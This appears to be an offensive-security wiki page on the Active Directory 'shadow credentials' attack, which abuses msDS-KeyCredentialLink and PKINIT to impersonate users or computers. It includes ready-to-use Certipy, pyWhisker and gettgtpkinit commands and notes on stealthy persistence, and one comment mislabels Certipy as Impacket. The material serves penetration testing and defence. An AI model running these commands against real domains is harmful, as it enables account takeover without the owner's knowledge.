---
title: "Shadow credentials: impersonation via key credentials"
description: "Abusing the msDS-KeyCredentialLink attribute to add attacker-controlled key credentials to a user or computer, then authenticating as that principal with PKINIT certificates without knowing or changing its password."
keywords:
  - shadow credentials
  - msDS-KeyCredentialLink
  - PKINIT
  - key trust
  - Whisker
---

# Shadow credentials

Windows Hello for Business lets an account authenticate with Kerberos using a **public key** instead of a password, through PKINIT. The mapping lives in the account's **`msDS-KeyCredentialLink`** attribute. If you can write that attribute, you can add your **own** key pair as a valid credential for the account, then authenticate as it via PKINIT, without knowing its password and without changing it. That last part is what makes shadow credentials preferable to a password reset: it is stealthy and does not lock the legitimate user out.

## The attack

```bash
# Impacket: add a key credential, then PKINIT to get a TGT (and the NT hash via UnPAC)
certipy shadow auto -u user@example.local -p pass -account 'TARGET$'

# or step by step with pyWhisker / Whisker
pywhisker.py -d example.local -u user -p pass --target 'victim' --action add
# -> produces a certificate; use it with PKINIT
gettgtpkinit.py -cert-pfx cred.pfx example.local/victim victim.ccache
```

The write permission on the target's `msDS-KeyCredentialLink` is the prerequisite, usually a `GenericWrite`/`GenericAll` ACL finding over the user or computer object ([ACL enumeration](../../dacl/acl-enumeration.md)).

## Why it is a favourite

- It turns a generic write over an object into **full authentication** as that object, no password reset needed.
- It is the cleanest way to abuse a writable **computer** object: add a key credential to `TARGET$`, PKINIT as the machine, then act with its key (silver tickets, RBCD).
- PKINIT returns a TGT, and the [UnPAC-the-hash](unpac-the-hash.md) technique recovers the account's **NT hash** from that same exchange, converting certificate access into a reusable hash.

## Exploitation notes

- The domain must support PKINIT (a domain controller with a certificate / the Key Trust model), which is the common case in AD CS environments.
- Shadow credentials are reversible: the added key can be removed afterward, so they double as quiet persistence.
- Pairs directly with AD CS abuse (the Certificates section) and RBCD; it is often the first move once BloodHound shows a write over a privileged object.

## Tools

- **Certipy** (`shadow auto`): end-to-end key-credential add plus PKINIT and hash recovery.
- **Whisker / pyWhisker**: add/list/remove `msDS-KeyCredentialLink` entries.
- **PKINITtools** (`gettgtpkinit.py`, `getnthash.py`): PKINIT TGT and UnPAC.

## References

- The Hacker Recipes: shadow credentials
- SpecterOps: Shadow Credentials (Key Trust abuse)
